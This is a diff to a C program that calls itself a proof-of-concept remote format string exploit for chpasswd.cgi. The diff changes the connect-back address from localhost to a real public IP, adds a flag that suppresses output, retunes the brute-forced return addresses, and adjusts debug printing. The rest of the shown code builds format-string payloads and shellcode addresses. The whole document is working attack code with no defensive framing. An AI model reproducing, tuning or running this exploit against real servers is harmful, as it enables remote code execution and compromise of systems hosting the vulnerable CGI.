@@ -45,7 +45,10 @@
 #include "net.h"
 
 
-#define MY_IP "127.0.0.1"
+#define MY_IP "65.19.178.5"
+
+
+int quite = 1;
 
 
 #define DEFAULT_CHPASSWD_CGI_PATH "/cgi-bin/chpasswd.cgi"
@@ -151,6 +154,10 @@ print_result_as_ascii (char * result)
 {
 	char * ptr;
 	int i;
+
+	if (quite) {
+		return;
+	}
 
 	ptr = NULL;
 	ptr = strstr (result, "<font color=red size=+2>");
@@ -343,7 +350,7 @@ brute_force_return_address (char *buffer, int maxlen, int align, int stack_heigh
 	higher_32bits = (shellcode_addr & 0xff000000) >> 24;
 
 	
-	printf ("DEBUG: %02x %02x %02x %02x\n", higher_32bits, lower_32bits, higher_16bits, lower_16bits);
+	//printf ("DEBUG: %02x %02x %02x %02x\n", higher_32bits, lower_32bits, higher_16bits, lower_16bits);
 
 	format_string_out_len = msg13_length + align + (8 * 4) + (8 * stack_height) + 1 + 12;
 	
@@ -529,7 +536,6 @@ post_chpasswd_user (char *ip, int port, char * cgi_path, char * user,
 	return (tot_out_len);
 }
 
-
 int
 main (int argc, char ** argv)
 {
@@ -553,8 +559,9 @@ main (int argc, char ** argv)
 	int found;
 
 	unsigned int expect_shellcode_addr = 0xbfffffff;
-	unsigned int expect_return_addr = 0xbffffcff;
-
+	unsigned int expect_return_addr = 0xbfffffff;
+	
+	expect_return_addr =0xbfffbcff;
 
 	int step = -128;
 
@@ -564,7 +571,6 @@ main (int argc, char ** argv)
 	int total_return_addr_retries;
 
 	int shellcode_size;
-
 
 	
 	puts ("Proof of concept chpasswd.cgi remote format string exploit");
@@ -723,9 +729,7 @@ main (int argc, char ** argv)
 
 
 		if (!strstr (result, "Internal Server Error")) {
-			printf ("\n");
 			print_result_as_ascii (result);
-			printf ("\n");
 
 			if ((ptr = strstr (result, "|CCC"))) {
 								
@@ -776,7 +780,6 @@ main (int argc, char ** argv)
 	getchar ();
 
 
-
 	step = -1;
 	total_return_addr_retries = 0;
 
@@ -797,7 +800,7 @@ main (int argc, char ** argv)
 		memset (result, 0, sizeof (result));
 
 
-		printf (">> Trying return address at 0x%08x. (%d)\r", expect_return_addr, ++total_return_addr_retries);
+		printf (">> Trying return address at 0x%08x. (%d)\n", expect_return_addr, ++total_return_addr_retries);
 		
 		brute_force_return_address (buffer, sizeof (buffer)-1, align, stack_height, expect_shellcode_addr, expect_return_addr, msg13_length);
 		
@@ -805,9 +808,7 @@ main (int argc, char ** argv)
 			continue;
 		}
 		
-		printf ("\n");
 		print_result_as_ascii (result);
-		printf ("\n");
 
 		expect_return_addr += step;
 	}
